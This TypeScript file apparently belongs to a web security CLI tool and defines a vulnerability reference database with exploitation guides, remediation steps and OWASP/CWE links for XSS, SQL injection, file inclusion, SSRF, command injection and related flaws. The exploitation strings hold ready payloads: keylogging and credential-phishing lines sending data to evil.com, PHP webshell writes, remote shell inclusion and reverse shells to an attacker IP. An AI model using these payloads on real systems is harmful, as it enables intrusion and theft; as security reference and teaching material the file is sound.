export interface VulnInfo {
  type: string;
  name: string;
  severity: "critical" | "high" | "medium" | "low";
  description: string;
  exploitation: string;
  remediation: string;
  references: string[];
}

const VULN_DATABASE: VulnInfo[] = [
  {
    type: "XSS",
    name: "Cross-Site Scripting",
    severity: "high",
    description: "Reflected XSS allows attackers to inject client-side scripts into web pages viewed by other users. The application reflects user input without proper sanitization.",
    exploitation: `1. Identify a parameter that reflects input in the response
2. Test with: <script>alert(document.cookie)</script>
3. If reflected, craft URL with payload and send to victim
4. Victim's browser executes the script in context of the target site
5. Steal cookies: document.cookie → send to attacker server
6. Keylogging: document.addEventListener('keydown', e => fetch('https://evil.com/log?k='+e.key))
7. Phishing: document.body.innerHTML='<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white"><form action="https://evil.com/steal">Login:<input name=u> Pass:<input name=p type=password><button>Submit</button></form></div>'`,
    remediation: `1. Encode all user input before rendering (HTML entity encoding)
2. Use Content-Security-Policy header to restrict script sources
3. Implement input validation (whitelist allowed characters)
4. Use framework built-in escaping (React JSX, Angular interpolation, etc.)
5. Set HttpOnly flag on session cookies`,
    references: ["OWASP XSS: https://owasp.org/www-community/attacks/xss/", "CWE-79: https://cwe.mitre.org/data/definitions/79.html"],
  },
  {
    type: "SQLi",
    name: "SQL Injection",
    severity: "critical",
    description: "SQL Injection allows attackers to interfere with database queries. The application concatenates user input directly into SQL statements without parameterization.",
    exploitation: `1. Find parameter that interacts with DB (login, search, id params)
2. Test with: ' OR '1'='1' -- to bypass auth
3. Enumerate columns: ' UNION SELECT NULL,NULL,NULL --
4. Extract DB version: ' UNION SELECT @@version --
5. List tables: ' UNION SELECT table_name FROM information_schema.tables --
6. Extract data: ' UNION SELECT password FROM users WHERE username='admin' --
7. Read files (MySQL): ' UNION SELECT LOAD_FILE('/etc/passwd') --
8. Write shell (MySQL): ' UNION SELECT '<?php system($_GET[cmd]);?>' INTO OUTFILE '/var/www/html/shell.php' --`,
    remediation: `1. Use parameterized queries / prepared statements ALWAYS
2. Use ORM frameworks that handle parameterization
3. Apply least-privilege database permissions
4. Validate and sanitize all input (whitelist approach)
5. Use WAF as additional layer (not primary defense)`,
    references: ["OWASP SQLi: https://owasp.org/www-community/attacks/SQL_Injection", "CWE-89: https://cwe.mitre.org/data/definitions/89.html"],
  },
  {
    type: "LFI",
    name: "Local File Inclusion",
    severity: "critical",
    description: "LFI allows attackers to read arbitrary files on the server by manipulating file path parameters. The application uses user input to construct file paths without validation.",
    exploitation: `1. Find parameter used in file operations (page, file, path, include, view)
2. Test with: ../../../../etc/passwd
3. Try null-byte bypass: ../../../../etc/passwd%00.jpg (older PHP < 5.3.4)
4. Double encoding: %2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
5. PHP wrappers: php://filter/convert.base64-encode/resource=index.php
6. PHP input wrapper: php://input (with POST body containing PHP code)
7. Log poisoning: include /var/log/apache2/access.log then trigger PHP code via User-Agent
8. Session files: /tmp/sess_<session_id> with injected PHP code`,
    remediation: `1. Whitelist allowed files/paths — never use user input directly in file paths
2. Use chroot or restrict base directory
3. Disable PHP wrappers (allow_url_include=Off, allow_url_fopen=Off)
4. Validate input against strict whitelist of allowed values
5. Use realpath() and check the resolved path is within allowed directory`,
    references: ["OWASP LFI: https://owasp.org/www-community/vulnerabilities/Local_File_Inclusion", "CWE-98: https://cwe.mitre.org/data/definitions/98.html"],
  },
  {
    type: "RFI",
    name: "Remote File Inclusion",
    severity: "critical",
    description: "RFI allows attackers to include remote files (typically malicious PHP shells) by manipulating include parameters. More dangerous than LFI as it enables remote code execution.",
    exploitation: `1. Identify include parameter: ?page=about → ?page=http://evil.com/shell.txt
2. Host malicious file on your server: <?php system($_GET['cmd']); ?>
3. Include via HTTP: ?page=http://attacker.com/shell.txt
4. Or via FTP: ?page=ftp://attacker.com/shell.txt
5. Execute commands: ?page=http://attacker.com/shell.txt&cmd=whoami
6. Reverse shell: cmd=nc -e /bin/bash attacker_ip 4444`,
    remediation: `1. Set allow_url_include=Off and allow_url_fopen=Off in php.ini
2. Whitelist allowed include files — never accept URLs as input
3. Use a front controller pattern instead of direct file includes
4. Keep PHP updated (null-byte tricks fixed in 5.3.4+)`,
    references: ["OWASP RFI: https://owasp.org/www-community/vulnerabilities/Remote_File_Inclusion"],
  },
  {
    type: "SSRF",
    name: "Server-Side Request Forgery",
    severity: "high",
    description: "SSRF allows attackers to make the server send requests to arbitrary destinations, including internal services. The application uses user-supplied URLs to make server-side requests.",
    exploitation: `1. Find URL parameter that the server fetches: ?url=http://example.com
2. Access internal services: ?url=http://localhost:8080/admin
3. AWS metadata: ?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
4. GCP metadata: ?url=http://metadata.google.internal/computeMetadata/v1/
5. Azure metadata: ?url=http://169.254.169.254/metadata/instance?api-version=2021-02-01
6. Scan internal ports: ?url=http://192.168.1.1:22 (timing-based detection)
7. Read local files: ?url=file:///etc/passwd
8. DNS rebinding: use domain that resolves to 127.0.0.1 on second lookup`,
    remediation: `1. Whitelist allowed domains/IPs — deny private ranges (10.x, 172.16-31.x, 192.168.x, 127.x, 169.254.x)
2. Disable file:// and other dangerous schemes
3. Use a dedicated network segment for outbound requests
4. Block responses from private IPs
5. Require explicit scheme (http/https only)`,
    references: ["OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery", "CWE-918: https://cwe.mitre.org/data/definitions/918.html"],
  },
  {
    type: "CMDi",
    name: "Command Injection",
    severity: "critical",
    description: "Command injection allows attackers to execute arbitrary OS commands by injecting them through user input that is passed to system shell functions like exec(), system(), or shell_exec().",
    exploitation: `1. Find parameter used in system command (ping, traceroute, nslookup tools)
2. Test with: ; id (command chaining)
3. Try operators: | id, && id, || id, \`id\`, $(id)
4. Newline injection: %0aid
5. Read files: ; cat /etc/passwd
6. Reverse shell: ; bash -i >& /dev/tcp/attacker_ip/4444 0>&1
7. Write webshell: ; echo '<?php system($_GET[c]);?>' > /var/www/html/s.php`,
    remediation: `1. NEVER pass user input to shell commands
2. Use language-native APIs instead of shell commands (e.g., socket APIs instead of 'ping')
3. If unavoidable, use strict input validation (alphanumeric whitelist only)
4. Escape all shell metacharacters
5. Run application with minimal OS privileges`,
    references: ["OWASP CMDi: https://owasp.org/www-community/attacks/Command_Injection", "CWE-78: https://cwe.mitre.org/data/definitions/78.html"],
  },
  {
    type: "PathTraversal",
    name: "Path Traversal / Directory Traversal",
    severity: "high",
    description: "Path traversal allows attackers to access files outside the intended directory by using ../ sequences or absolute paths in user-controlled file references.",
    exploitation: `1. Find parameter referencing files: ?file=report.pdf
2. Traverse up: ?file=../../../../etc/passwd
3. Try Windows paths: ?file=..\\..\\..\\windows\\system32\\config\\sam
4. URL encoding: ?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
5. Double encoding: ?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
6. Unicode encoding: ?file=..%c0%af..%c0%af..%c0%afetc/passwd
7. Start from root: ?file=/etc/passwd (absolute path)`,
    remediation: `1. Validate input against whitelist of allowed filenames
2. Use realpath() and verify resolved path is within intended directory
3. Use chroot jails to restrict file access
4. Strip ../ and ..\\ sequences (but don't rely on this alone — bypasses exist)
5. Use unique file IDs instead of filenames in parameters`,
    references: ["OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal", "CWE-22: https://cwe.mitre.org/data/definitions/22.html"],
  },
  {
    type: "OpenRedirect",
    name: "Open Redirect",
    severity: "medium",
    description: "Open redirect allows attackers to redirect users to arbitrary URLs via a trusted domain. Used in phishing attacks to make malicious URLs appear legitimate.",
    exploitation: `1. Find redirect parameter: ?redirect=http://example.com or ?next=/dashboard
2. Test with external URL: ?redirect=https://evil.com
3. Try URL encoding: ?redirect=%68%74%74%70%73%3a%2f%2fevil%2ecom
4. Protocol bypass: ?redirect=//evil.com (protocol-relative)
5. Use in phishing: https://trusted.com/login?redirect=https://evil.com/fake-login
6. Token theft: redirect to attacker site that reads Referer header`,
    remediation: `1. Whitelist allowed redirect destinations
2. Use relative paths only for internal redirects
3. Validate URL scheme (only https://)
4. Verify redirect target belongs to same domain
5. Add user confirmation page before redirecting externally`,
    references: ["OWASP Open Redirect: https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html"],
  },
  {
    type: "InfoLeak",
    name: "Information Disclosure / Leak",
    severity: "high",
    description: "Sensitive information is exposed to unauthorized parties. This includes source code, configuration files, database credentials, internal paths, stack traces, and debug information.",
    exploitation: `1. Access exposed files: /.git/config, /.env, /backup.sql
2. Check error pages for stack traces revealing internal paths
3. Look for phpinfo(): /phpinfo.php
4. Check /.well-known/security.txt for internal info
5. Examine /robots.txt for hidden directories
6. Check /sitemap.xml for administrative areas
7. View source for comments containing credentials/API keys
8. Check HTTP headers for version info (Server, X-Powered-By)
9. Access /server-status, /server-info (Apache)
10. Check /swagger.json, /api/docs for API documentation`,
    remediation: `1. Remove all backup/config files from web root
2. Deny access to dot-files (.git, .env, .htaccess)
3. Disable directory listing
4. Configure custom error pages (no stack traces in production)
5. Remove phpinfo.php and similar debug scripts
6. Strip identifying headers (Server, X-Powered-By)
7. Block access to /server-status, /server-info, /actuator endpoints`,
    references: ["CWE-200: https://cwe.mitre.org/data/definitions/200.html"],
  },
  {
    type: "AuthBypass",
    name: "Authentication Bypass",
    severity: "critical",
    description: "Authentication mechanisms can be circumvented, allowing unauthorized access. This includes default credentials, weak password policies, broken session management, and logic flaws.",
    exploitation: `1. Try default credentials: admin/admin, admin/password, root/root, admin/admin123
2. SQL injection in login: ' OR '1'='1' -- as username
3. Type juggling: username[]=admin (PHP array bypass)
4. Null byte: admin%00
5. Case manipulation: Admin, ADMIN, admin%20
6. Parameter pollution: username=admin&username=guest
7. HTTP method switching: POST login → PUT login
8. JSON injection: {"username":"admin","password":{"$gt":""}} (MongoDB)
9. Session fixation: set session cookie before login
10. JWT manipulation: change alg to "none", modify claims, no signature
11. 2FA bypass: skip /verify-2fa endpoint, go directly to /dashboard`,
    remediation: `1. Enforce strong password policies
2. Implement account lockout after N failed attempts
3. Use multi-factor authentication
4. Regenerate session ID after login
5. Validate JWT signatures properly, reject "none" algorithm
6. Use parameterized queries for authentication
7. Rate limit login attempts
8. Monitor for credential stuffing`,
    references: ["OWASP Auth: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/", "CWE-287: https://cwe.mitre.org/data/definitions/287.html"],
  },
  {
    type: "WAF",
    name: "WAF Detection / Bypass",
    severity: "medium",
    description: "Web Application Firewall detected. WAFs filter malicious requests but can often be bypassed using encoding tricks, HTTP parameter pollution, and other techniques.",
    exploitation: `WAF Bypass Techniques:
1. URL encoding: %3Cscript%3E instead of <script>
2. Double encoding: %253Cscript%253E
3. Unicode encoding: %u003Cscript%u003E
4. HTML entities: &#60;script&#62;
5. Case mixing: <ScRiPt>
6. Null bytes: <scr%00ipt>
7. Newlines: <scr\\nipt>
8. Comments: <scr<!---->ipt>
9. HTTP parameter pollution: id=1&id=UNION SELECT
10. Chunked transfer encoding
11. HTTP/2 request smuggling
12. Multipart/form-data with different content type`,
    remediation: `1. WAF is a defense layer, NOT the primary security mechanism
2. Fix vulnerabilities at the application level
3. Keep WAF rules updated
4. Use positive security model (allow known good, block everything else)
5. Monitor WAF logs for bypass attempts`,
    references: ["OWASP WAF: https://owasp.org/www-community/Web_Application_Firewall"],
  },
];

import chalk from "chalk";

export function getVulnInfo(type: string): VulnInfo | undefined {
  return VULN_DATABASE.find((v) => v.type.toLowerCase() === type.toLowerCase());
}

export function getAllVulnTypes(): string[] {
  return VULN_DATABASE.map((v) => v.type);
}

export function printVulnGuide(type: string): void {
  const info = getVulnInfo(type);
  if (!info) {
    console.log(chalk.red(`  Unknown vulnerability type: ${type}`));
    console.log(chalk.gray(`  Available: ${getAllVulnTypes().join(", ")}`));
    return;
  }

  const sevColor = info.severity === "critical" ? chalk.red.bold : info.severity === "high" ? chalk.keyword("orange") : info.severity === "medium" ? chalk.yellow : chalk.green;

  const content = [
    "",
    chalk.bold.white(`  ${info.name} [${info.type}]`),
    chalk.gray(`  Severity: ${sevColor(info.severity.toUpperCase())}`),
    "",
    chalk.cyan.bold("  Description:"),
    chalk.white(`  ${info.description}`),
    "",
    chalk.red.bold("  Exploitation Guide:"),
    ...info.exploitation.split("\n").map((l) => chalk.keyword("orange")("  " + l)),
    "",
    chalk.green.bold("  Remediation:"),
    ...info.remediation.split("\n").map((l) => chalk.green("  " + l)),
    "",
    chalk.blue.bold("  References:"),
    ...info.references.map((r) => chalk.blue(`  → ${r}`)),
    "",
  ].join("\n");

  console.log(
    require("boxen")(content, {
      padding: { top: 0, bottom: 0, left: 1, right: 1 },
      borderStyle: "round",
      borderColor: info.severity === "critical" ? "red" : info.severity === "high" ? "yellow" : "cyan",
      margin: { top: 1, bottom: 0, left: 0, right: 0 },
    })
  );
}

export { VULN_DATABASE };
